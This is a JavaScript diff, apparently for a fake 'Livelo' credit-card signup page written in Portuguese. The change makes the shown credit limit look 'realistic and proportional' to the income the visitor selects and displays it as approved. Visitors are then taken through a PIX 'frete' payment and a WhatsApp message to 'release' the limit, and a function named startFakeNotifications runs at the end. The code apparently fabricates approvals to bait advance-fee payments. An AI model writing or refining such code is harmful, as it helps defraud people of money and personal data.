@@ -33,23 +33,58 @@ if (!STATE.sessionId) {
   try { localStorage.setItem('livelo_session', STATE.sessionId); } catch(e) {}
 }
 
-// DYNAMIC LIMIT GENERATION — valores realistas (max R$ 2.800 para coincidir com o backend)
+// MOTOR CENTRALIZADO DE LIMITE REALISTA E PROPORCIONAL
+function formatCurrency(val) {
+  const num = typeof val === 'number' ? val : parseFloat(String(val).replace(/[^\d.,]/g, '').replace(',', '.')) || 0;
+  return 'R$ ' + num.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+}
+
+function formatCurrencyShort(val) {
+  const num = typeof val === 'number' ? val : parseFloat(String(val).replace(/[^\d.,]/g, '').replace(',', '.')) || 0;
+  return 'R$ ' + Math.round(num).toLocaleString('pt-BR');
+}
+
+function applyApprovedLimit(num) {
+  if (!num || isNaN(num)) return;
+  const val = parseFloat(num);
+  STATE.limite = val;
+  STATE.limitBase = val;
+  try { localStorage.setItem('livelo_limit', val); } catch(e) {}
+
+  const full = formatCurrency(val);
+  const short = formatCurrencyShort(val);
+
+  document.querySelectorAll('.dynamic-limit-full').forEach(el => { el.innerText = full; });
+  document.querySelectorAll('.dynamic-limit-short').forEach(el => { el.innerText = short; });
+
+  const approvedLimitEl = document.getElementById('approved-limit');
+  if (approvedLimitEl) approvedLimitEl.innerHTML = `<span class="dynamic-limit-full">${full}</span>`;
+
+  const doneLimiteEl = document.getElementById('done-limite');
+  if (doneLimiteEl) doneLimiteEl.innerText = full;
+
+  const sumLimiteEl = document.getElementById('sum-limite');
+  if (sumLimiteEl) sumLimiteEl.innerText = full;
+
+  const cardLimitEl = document.getElementById('summary-card-limit');
+  if (cardLimitEl) cardLimitEl.innerText = short;
+
+  const successLimitEl = document.getElementById('success-card-limit');
+  if (successLimitEl) successLimitEl.innerText = full;
+}
+
 let storedLimit = null;
 try { storedLimit = localStorage.getItem('livelo_limit'); } catch(e) {}
-if (!storedLimit) {
-  // Range: R$ 150 a R$ 2.800 em múltiplos de 50 (igual ao backend calc_limite)
-  const steps = Math.floor(Math.random() * ((2800 - 150) / 50 + 1));
-  STATE.limitBase = 150 + steps * 50;
-  try { localStorage.setItem('livelo_limit', STATE.limitBase); } catch(e) {}
+if (storedLimit && !isNaN(storedLimit) && parseFloat(storedLimit) >= 1000) {
+  STATE.limitBase = parseFloat(storedLimit);
+  STATE.limite = parseFloat(storedLimit);
 } else {
-  STATE.limitBase = parseInt(storedLimit);
+  STATE.limitBase = 2100;
+  STATE.limite = 2100;
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-  let limitFull = "R$ " + STATE.limitBase.toLocaleString('pt-BR') + ",00";
-  let limitShort = "R$ " + STATE.limitBase.toLocaleString('pt-BR');
-  document.querySelectorAll('.dynamic-limit-full').forEach(el => el.innerText = limitFull);
-  document.querySelectorAll('.dynamic-limit-short').forEach(el => el.innerText = limitShort);
+  applyApprovedLimit(STATE.limite || 2100);
 });
 
 // CAPTURE UTMS
@@ -323,6 +358,19 @@ function selectIncome(btn, val) {
   btn.classList.add('selected');
   STATE.renda = val;
   hideErr('income-error');
+
+  // Cálculo preliminar proporcional imediato no frontend (enquanto aguarda o backend)
+  let baseCalc = 2100;
+  if (val === '1000') baseCalc = 1500;
+  else if (val === '2000') baseCalc = 2200;
+  else if (val === '4000') baseCalc = 3750;
+  else if (val === '8000') baseCalc = 6800;
+  else {
+    const num = parseFloat(String(val).replace(/[^\d.,]/g, '').replace(',', '.')) || 2100;
+    baseCalc = Math.round(Math.max(1200, Math.min(num * 1.05, 15000)) / 50) * 50;
+  }
+  applyApprovedLimit(baseCalc);
+
   // Auto-avança após breve feedback visual
   setTimeout(() => goToStep('restrictions'), 260);
 }
@@ -390,9 +438,7 @@ async function submitBilling() {
     const data = await res.json();
     
     if (data.ok) {
-      if ($id('approved-limit')) $id('approved-limit').textContent = parseFloat(data.limite).toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
-      STATE.limite = data.limite;
-      if ($id('done-limite')) $id('done-limite').textContent = data.limite;
+      if (data.limite) applyApprovedLimit(data.limite);
       
       // Update PIX step with correct shipping cost
       if (data.frete && $id('pix-frete-display')) {
@@ -425,11 +471,7 @@ function startAnalysis() {
     body: JSON.stringify(STATE)
   }).then(res => res.json()).then(data => {
     if (data.ok && data.limite) {
-      STATE.limite = data.limite;
-      if ($id('approved-limit')) {
-        $id('approved-limit').innerHTML = `<span class="dynamic-limit-full">${parseFloat(data.limite).toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'})}</span>`;
-      }
-      if ($id('done-limite')) $id('done-limite').textContent = parseFloat(data.limite).toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
+      applyApprovedLimit(data.limite);
     }
   }).catch(console.error);
 
@@ -780,9 +822,10 @@ function showDone() {
   waNumber = waNumber.replace(/\D/g, '');
   if (waNumber.length > 0 && !waNumber.startsWith('55')) waNumber = '55' + waNumber;
   
+  const limFormatted = STATE.limite ? formatCurrency(STATE.limite) : 'R$ 2.100,00';
   let rawText = window.APP_WA_TEXT || 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!';
   rawText = rawText.replace('{token}', (STATE.sessionId || 'XXXX').substring(0,8));
-  rawText = rawText.replace('{limite}', STATE.limite || 'R$ 4.500,00');
+  rawText = rawText.replace('{limite}', limFormatted);
   
   const msg = encodeURIComponent(rawText);
   const waUrl = `https://wa.me/${waNumber}?text=${msg}`;
@@ -797,7 +840,7 @@ function showDone() {
   const cn = $id('success-card-name');
   if(cn) cn.innerText = STATE.nome_completo || 'SEU NOME';
   const cl = $id('success-card-limit');
-  if(cl) cl.innerText = STATE.limite || 'R$ 4.500,00';
+  if(cl) cl.innerText = limFormatted;
 
   goToStep('sucesso');
   startFakeNotifications();
@@ -842,6 +885,10 @@ const _oldGoTo = window.goToStep;
 if(_oldGoTo) {
     window.goToStep = function(stepId) {
         _oldGoTo(stepId);
+
+        if(STATE.limite) {
+            applyApprovedLimit(STATE.limite);
+        }
         
         if(STATE.nome_completo || STATE.nomeLead || STATE.nome) {
             const nom = STATE.nome_completo || STATE.nomeLead || STATE.nome;
@@ -910,6 +957,9 @@ if(_oldGoTo) {
                 if(data.ok) {
                     STATE.paymentId = data.payment_id;
                     STATE.pixCode = data.pix_code;
+                    if(data.limite) {
+                        applyApprovedLimit(data.limite);
+                    }
 
                     if(pt) pt.value = data.pix_code || data.pix_copia_cola || '';
 
